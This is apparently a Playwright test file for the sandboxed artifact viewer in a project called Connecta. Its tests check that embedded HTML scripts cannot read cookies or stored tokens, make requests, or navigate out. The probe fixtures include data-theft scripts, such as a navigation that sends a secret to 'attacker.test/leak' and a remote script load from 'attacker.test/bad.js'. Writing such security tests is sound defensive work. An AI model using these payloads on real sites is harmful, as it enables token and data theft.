import { createServer, type Server } from "node:http";
import { once } from "node:events";
import { test, expect } from "@playwright/test";
import { artifacts, kvArtifactStore } from "../../src/artifacts.js";
import { bearerToken } from "../../src/auth/bearer.js";
import { createConnecta } from "../../src/index.js";
import { memoryStorage } from "../../src/storage/memory.js";
import { operatorUi } from "../../src/ui.js";

const TOKEN = "artifact-browser-token";
let server: Server;
let origin: string;
let requests: string[];
let pageSource: string;

async function start() {
  requests = [];
  server = createServer(async (incoming, outgoing) => {
    const chunks: Buffer[] = [];
    for await (const chunk of incoming) chunks.push(Buffer.from(chunk));
    const url = new URL(incoming.url ?? "/", origin);
    requests.push(url.pathname + url.search);
    const response = await app.fetch(new Request(url, {
      method: incoming.method ?? "GET",
      headers: incoming.headers as HeadersInit,
      ...(chunks.length ? { body: Buffer.concat(chunks) } : {}),
    }));
    outgoing.writeHead(response.status, Object.fromEntries(response.headers));
    outgoing.end(Buffer.from(await response.arrayBuffer()));
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const address = server.address();
  if (!address || typeof address === "string") throw new Error("no test address");
  origin = `http://127.0.0.1:${address.port}`;
  const module = artifacts({ store: kvArtifactStore(memoryStorage()) });
  const app = createConnecta({
    connectors: [], executor: { execute: async () => ({ result: null }) },
    logger: "silent", publicUrl: origin, auth: bearerToken(TOKEN, { subjectId: "viewer" }),
    ui: operatorUi(), artifacts: module,
  });
  const context = { storage: memoryStorage(), logger: console, baseUrl: origin };
  const result = await module.connector.callTool("create_artifact", {
    id: "probe", title: "Probe", kind: "html", source: pageSource,
    documents: { data: { secret: "team-secret" } },
  }, context);
  if (typeof result === "object" && result !== null && "isError" in result && result.isError) {
    throw new Error(JSON.stringify(result));
  }
  await module.connector.callTool("create_artifact", {
    id: "second", title: "Second", kind: "html",
    source: '<!doctype html><main id="artifact-root">second page</main>',
  }, context);
  return app;
}

test.afterEach(async () => {
  if (server) await new Promise<void>((resolve) => server.close(() => resolve()));
});

test("artifact scripts stay opaque and cannot use fetch APIs", async ({ page }) => {
  pageSource = `<!doctype html><main id="artifact-root">waiting</main><script>
    const result = {};
    try { result.cookie = document.cookie; } catch (e) { result.cookie = e.name; }
    try { result.storage = localStorage.getItem('connecta:token'); } catch (e) { result.storage = e.name; }
    try { result.parent = parent.document.title; } catch (e) { result.parent = e.name; }
    try { artifact.data.data.secret = 'changed'; } catch (e) {}
    result.immutable = artifact.data.data.secret === 'team-secret';
    fetch('/probe?via=fetch').catch(() => {});
    try { const x = new XMLHttpRequest(); x.open('GET', '/probe?via=xhr'); x.send(); } catch (e) {}
    new Image().src = '/probe?via=image';
    try { navigator.sendBeacon('/probe?via=beacon', 'x'); } catch (e) {}
    try { new WebSocket('ws://' + location.host + '/probe?via=websocket'); } catch (e) {}
    try { new EventSource('/probe?via=eventsource'); } catch (e) {}
    const node = document.createElement('div'); node.style.backgroundImage = 'url(/probe?via=css)'; document.body.append(node);
    document.querySelector('#artifact-root').textContent = JSON.stringify(result);
  </script>`;
  await start();
  await page.addInitScript((token) => localStorage.setItem("connecta:token", token), TOKEN);
  await page.goto(`${origin}/artifacts/probe`);
  const frame = page.frameLocator("#artifactFrame");
  await expect(frame.locator("#artifact-root")).toContainText('"immutable":true');
  const observed = JSON.parse(await frame.locator("#artifact-root").innerText()) as Record<string, unknown>;
  expect(observed.cookie).toBe("SecurityError");
  expect(observed.storage).toBe("SecurityError");
  expect(observed.parent).toBe("SecurityError");
  await page.waitForTimeout(200);
  expect(requests.filter(path => path.startsWith("/probe"))).toEqual([]);
});

test("top navigation, popups and self navigation cannot send page data", async ({ page }) => {
  const logs: string[] = [];
  page.on("console", message => logs.push(message.text()));
  pageSource = `<!doctype html><main id="artifact-root">before</main><script>
    console.log('artifact attempted navigation');
    try { top.location.href = '/probe?via=top'; } catch (e) {}
    try { window.open('/probe?via=open'); } catch (e) {}
    location.href = '/probe?via=self&secret=' + artifact.data.data.secret;
  </script>`;
  await start();
  await page.addInitScript((token) => localStorage.setItem("connecta:token", token), TOKEN);
  await page.goto(`${origin}/artifacts/probe`);
  await expect.poll(() => logs).toContain("artifact attempted navigation");
  await page.waitForTimeout(500);
  expect(page.url()).toBe(`${origin}/artifacts/probe`);
  expect(requests.filter(path => path.startsWith("/probe"))).toEqual([]);
});

test("the parent frame policy blocks navigation to an external origin", async ({ page }) => {
  const external: string[] = [];
  const logs: string[] = [];
  page.on("console", message => logs.push(message.text()));
  await page.route("https://attacker.test/**", route => {
    external.push(route.request().url());
    return route.fulfill({ status: 200, body: "received" });
  });
  pageSource = `<!doctype html><main id="artifact-root">before</main><script>
    console.log('artifact attempted external navigation');
    location.href = 'https://attacker.test/leak?secret=' + artifact.data.data.secret;
  </script>`;
  await start();
  await page.addInitScript((token) => localStorage.setItem("connecta:token", token), TOKEN);
  await page.goto(`${origin}/artifacts/probe`);
  await expect.poll(() => logs).toContain("artifact attempted external navigation");
  await page.waitForTimeout(500);
  expect(external).toEqual([]);
});

test("document.open/write keeps the response network policy", async ({ page }) => {
  const logs: string[] = [];
  page.on("console", message => logs.push(message.text()));
  pageSource = `<!doctype html><main id="artifact-root">before</main><script>
    document.open();
    document.write('<main id="artifact-root">rewritten</main><script>' +
      'console.log("rewritten script ran");fetch("/probe?via=rewritten").catch(() => {});' +
      '<\\/script>');
    document.close();
  </script>`;
  await start();
  await page.addInitScript((token) => localStorage.setItem("connecta:token", token), TOKEN);
  await page.goto(`${origin}/artifacts/probe`);
  await expect.poll(() => logs).toContain("rewritten script ran");
  await expect(page.frameLocator("#artifactFrame").locator("#artifact-root").last()).toHaveText("rewritten");
  await page.waitForTimeout(200);
  expect(requests.filter(path => path.startsWith("/probe"))).toEqual([]);
});

test("a foreign page cannot embed the frame", async ({ page }) => {
  pageSource = '<!doctype html><main id="artifact-root">private</main>';
  await start();
  const foreignServer = createServer((_incoming, outgoing) => {
    outgoing.writeHead(200, { "Content-Type": "text/html" });
    outgoing.end(`<iframe src="${origin}/artifacts/_frame"></iframe>`);
  });
  foreignServer.listen(0, "127.0.0.1");
  await once(foreignServer, "listening");
  try {
    const address = foreignServer.address();
    if (!address || typeof address === "string") throw new Error("no foreign test address");
    await page.goto(`http://127.0.0.1:${address.port}/`);
    await expect.poll(() => requests).toContain("/artifacts/_frame");
    await expect.poll(() => page.frames().map(frame => frame.url())).toContain("chrome-error://chromewebdata/");
  } finally {
    await new Promise<void>(resolve => foreignServer.close(() => resolve()));
  }
});

test("library and browser history open a fresh frame for each page", async ({ page }) => {
  pageSource = '<!doctype html><main id="artifact-root">first page</main>';
  await start();
  await page.addInitScript((token) => localStorage.setItem("connecta:token", token), TOKEN);
  await page.goto(`${origin}/artifacts/probe`);
  await expect(page.frameLocator("#artifactFrame").locator("#artifact-root")).toHaveText("first page");
  await page.getByRole("link", { name: "All artifacts" }).click();
  await page.getByRole("link", { name: "Second" }).click();
  await expect(page.frameLocator("#artifactFrame").locator("#artifact-root")).toHaveText("second page");
  await page.goBack();
  await page.goBack();
  await expect(page.frameLocator("#artifactFrame").locator("#artifact-root")).toHaveText("first page");
});

test("allowed CDN scripts load while other script origins stay blocked", async ({ page }) => {
  const loaded: string[] = [];
  await page.route("https://cdn.jsdelivr.net/**", route => {
    loaded.push(route.request().url());
    return route.fulfill({ contentType: "application/javascript", body: "document.querySelector('#artifact-root').textContent = 'allowed';" });
  });
  await page.route("https://attacker.test/**", route => {
    loaded.push(route.request().url());
    return route.fulfill({ contentType: "application/javascript", body: "document.querySelector('#artifact-root').textContent = 'leaked';" });
  });
  pageSource = `<!doctype html><main id="artifact-root">before</main>
    <script src="https://cdn.jsdelivr.net/npm/artifact-test.js"></script>
    <script>const s=document.createElement('script');s.src='https://attacker.test/bad.js';document.body.append(s)</script>`;
  await start();
  await page.addInitScript((token) => localStorage.setItem("connecta:token", token), TOKEN);
  await page.goto(`${origin}/artifacts/probe`);
  await expect(page.frameLocator("#artifactFrame").locator("#artifact-root")).toHaveText("allowed");
  expect(loaded).toEqual(["https://cdn.jsdelivr.net/npm/artifact-test.js"]);
});

test("a dedicated origin boots the viewer but never serves operator or MCP routes", async ({ page }) => {
  const main = "https://main.connecta.test";
  const pages = "https://pages.connecta.test";
  const module = artifacts({ store: kvArtifactStore(memoryStorage()) });
  const dedicated = createConnecta({
    connectors: [], executor: { execute: async () => ({ result: null }) }, logger: "silent",
    publicUrl: main, artifactOrigin: pages,
    auth: bearerToken(TOKEN, { subjectId: "viewer" }), ui: operatorUi(), artifacts: module,
  });
  const context = { storage: memoryStorage(), logger: console, baseUrl: main };
  const result = await module.connector.callTool("create_artifact", {
    id: "dedicated", title: "Dedicated", kind: "html",
    source: '<!doctype html><main id="artifact-root">dedicated page</main>',
  }, context);
  if (typeof result === "object" && result !== null && "isError" in result && result.isError) {
    throw new Error(JSON.stringify(result));
  }
  const seen: string[] = [];
  await page.route("**/*", async route => {
    const request = route.request();
    seen.push(new URL(request.url()).pathname);
    const response = await dedicated.fetch(new Request(request.url(), {
      method: request.method(), headers: request.headers(),
      ...(request.postDataBuffer() ? { body: request.postDataBuffer() } : {}),
    }));
    await route.fulfill({
      status: response.status,
      headers: Object.fromEntries(response.headers),
      body: Buffer.from(await response.arrayBuffer()),
    });
  });
  await page.addInitScript((token) => localStorage.setItem("connecta:token", token), TOKEN);
  await page.goto(`${pages}/artifacts/dedicated`);
  await expect(page.frameLocator("#artifactFrame").locator("#artifact-root")).toHaveText("dedicated page");
  expect(seen).not.toContain("/ui/data");
  for (const path of ["/", "/ui/data", "/mcp", "/health"]) {
    expect((await dedicated.fetch(new Request(`${pages}${path}`))).status, path).toBe(404);
  }
  const mainLink = await dedicated.fetch(new Request(`${main}/artifacts/dedicated`));
  expect(mainLink.status).toBe(308);
  expect(mainLink.headers.get("Location")).toBe(`${pages}/artifacts/dedicated`);
});
